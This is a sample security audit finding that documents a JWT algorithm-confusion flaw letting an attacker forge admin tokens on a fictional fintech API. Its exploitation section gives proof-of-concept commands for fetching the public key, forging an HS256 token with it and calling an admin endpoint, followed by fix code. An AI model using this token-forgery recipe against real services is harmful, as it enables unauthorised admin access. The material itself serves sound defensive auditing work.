# Sample PANTHEON Finding

This is a worked example of a complete PANTHEON-NNNN finding. Reference for format compliance.

### PANTHEON-0042: JWT algorithm confusion enables admin impersonation

**Metadata**:
- Audit ID: f47ac10b-58cc-4372-a567-0e02b2c3d479
- Discovered by: trail-of-bits-auditor
- Phase: 3 (ASVS L3 Audit)
- Discovered at: 2026-05-27T14:32:18Z
- Status: accepted

**Severity**:
- Severity: Critical
- CVSS v4.0 vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
- CVSS v4.0 score: 9.3
- Exploitation Difficulty: Low
- Business Impact: $2,500,000. Reasoning: full admin access to fintech platform enables unauthorized transfers from customer accounts. Average per-incident regulatory penalty estimated at MXN 25M ($1.25M USD) per CNBV CUIFPEs Art. 56 plus customer reimbursement and reputational damage.
- Threat Actors Capable: [T1, T2, T3, T4, T6, T8]

**Affected**:
- Component: Authentication subsystem
- File(s): `apps/api/src/auth/jwt.service.ts:42-89`
- Function/Endpoint: `JwtService.verify()` consumed by `apps/api/src/auth/auth.guard.ts:18`
- First introduced: commit `a3f2d4e1` (2025-11-14)

**Description**:

The JWT verification function in `apps/api/src/auth/jwt.service.ts:42-89` reads the `alg` claim from the unverified token header and uses it to select the verification algorithm. This pattern enables algorithm confusion attacks documented in CVE-2018-1000531 and related research.

Specifically, the code at line 56 invokes `jwt.verify(token, this.publicKey)` without passing the `algorithms` parameter. When an attacker submits a token with `alg: HS256` (HMAC) instead of the expected `alg: RS256` (RSA), the verification library uses `this.publicKey` (the RSA public key) as the HMAC secret. Since RSA public keys are typically known or discoverable (via `.well-known/jwks.json`), the attacker can forge valid HS256 tokens.

This means any unauthenticated attacker who can read the RSA public key (publicly exposed at `https://api.phoenix.example.com/.well-known/jwks.json`) can mint JWTs for any user, including administrators.

**Exploitation Scenario**:

1. Attacker fetches public key:
```bash
curl https://api.phoenix.example.com/.well-known/jwks.json | jq '.keys[0].x5c[0]'
```

2. Attacker decodes the RSA public key from base64.

3. Attacker constructs JWT payload claiming admin role:
```json
{
  "sub": "00000000-0000-0000-0000-000000000001",
  "email": "admin@phoenix.example.com",
  "role": "admin",
  "iat": 1716816000,
  "exp": 1716902400
}
```

4. Attacker signs with HS256 using the public key as the HMAC secret:
```bash
# Using jsonwebtoken CLI for illustration
node -e "
const jwt = require('jsonwebtoken');
const pubKey = fs.readFileSync('pubkey.pem');
const token = jwt.sign({sub:'...',role:'admin',...}, pubKey, {algorithm:'HS256'});
console.log(token);
"
```

5. Attacker submits to admin endpoint:
```bash
curl -H "Authorization: Bearer <forged-token>" https://api.phoenix.example.com/admin/users
```

6. Server's `JwtService.verify()` reads `alg: HS256` from header, uses public key as HMAC secret, signature validates, claims trusted, admin access granted.

**Recommendation (Short-term)**:

Modify `apps/api/src/auth/jwt.service.ts:56`:

```typescript
// BEFORE (vulnerable)
return jwt.verify(token, this.publicKey);

// AFTER (fixed)
return jwt.verify(token, this.publicKey, {
  algorithms: ['RS256']  // restrict to expected algorithm only
});
```

This single-parameter change forces verification with RS256 only, rejecting any token claiming `alg: HS256` or `alg: none`.

**Recommendation (Long-term)**:

1. Audit all JWT verification call sites across the codebase to ensure consistent algorithm restriction.

2. Introduce a wrapper module that enforces algorithm restriction by default:
```typescript
// jwt-safe.ts
export function verifyJwtStrict(token: string, key: string | Buffer): JwtPayload {
  return jwt.verify(token, key, {
    algorithms: ['RS256'],  // hardcoded
    issuer: 'phoenix-financial-os',
    audience: 'phoenix-api'
  }) as JwtPayload;
}
```

3. Add ESLint rule prohibiting `jwt.verify()` without `algorithms` option.

4. Add SAST rule (Semgrep) detecting unsafe JWT verification patterns.

5. Implement asymmetric-only key management: do not use HMAC-based JWTs anywhere in the platform.

6. Consider migration to PASETO or branca tokens which avoid the algorithm-confusion attack class by design.

**Compliance Mappings**:

```json
{
  "cwe": "CWE-345",
  "owasp_top10": "A02:2021",
  "owasp_api_top10": "API2:2023",
  "owasp_asvs_v5_l3": ["3.5.2", "3.5.3"],
  "cnbv_cuf_cuifpes": ["Art. 56 CUIFPEs"],
  "lfpdppp_2025": ["Art. 31"],
  "sat_cff": null,
  "gdpr": ["Art. 32"],
  "pci_dss_401": ["Req. 6.2.4"],
  "hipaa": null,
  "soc2_tsc": ["CC6.1"],
  "iso27001_annex_a": ["A.8.2.3", "A.8.5.2"],
  "iso27017": null,
  "iso27018": null,
  "iso27701": null,
  "nist_800_53_rev5": ["IA-2", "SC-13"],
  "mitre_attack": ["T1078", "T1212"],
  "capec": ["CAPEC-21", "CAPEC-114"],
  "mapping_confidence": 0.95,
  "mapping_notes": "Primary: CWE-345 (Insufficient Verification of Data Authenticity). ASVS 3.5.2/3.5.3 are L3 requirements for token validation. CNBV CUIFPEs Art. 56 applies due to fintech scope. GDPR Art. 32 (security of processing) given EU customer data."
}
```

**Adversarial Gate**:

- Reviewed by: adversarial-judge
- Verdict: ACCEPT
- Confidence: 0.95
- Reviewed at: 2026-05-27T14:38:42Z
- Cross-examination:
  1. Working PoC: PASS - concrete reproduction with curl + Node.js
  2. Severity defensibility: PASS - Critical defensible (unauthenticated full admin access)
  3. Threat actor specificity: PASS - T1-T8 except T5 (no insider needed)
  4. CVSS vector correctness: PASS - mathematically consistent
  5. Path to production impact: PASS - public key endpoint verified accessible
  6. False positive check: PASS - no defense in depth blocks this (single algorithm-restriction missing)
  7. Existing mitigation cross-check: PASS - verified no other middleware re-validates JWT algorithm
- Verification files read: `apps/api/src/auth/jwt.service.ts:42-89`, `apps/api/src/auth/auth.guard.ts:18-25`, `apps/api/src/auth/auth.module.ts:1-50`
- Notes: textbook algorithm confusion vulnerability. Public key endpoint confirmed at /.well-known/jwks.json. No compensating control elsewhere.
- PoC verified: yes
- Cross-verified by: [ncc-group-auditor, cure53-web-app]

**References**:

- CVE-2018-1000531 (jsonwebtoken)
- "Critical vulnerabilities in JSON Web Token libraries" Tim McLean (2015) - https://www.chosenplaintext.ca/2015/03/31/jwt-algorithm-confusion.html
- CWE-345: Insufficient Verification of Data Authenticity
- OWASP ASVS 5.0 V3.5.2: "Stateless tokens are validated using digital signatures"
- RFC 7519 (JWT)
- RFC 8725 (JSON Web Token Best Current Practices) Section 3.1 (Always specify a defined algorithm)
- Trail of Bits "Use audited cryptography libraries"
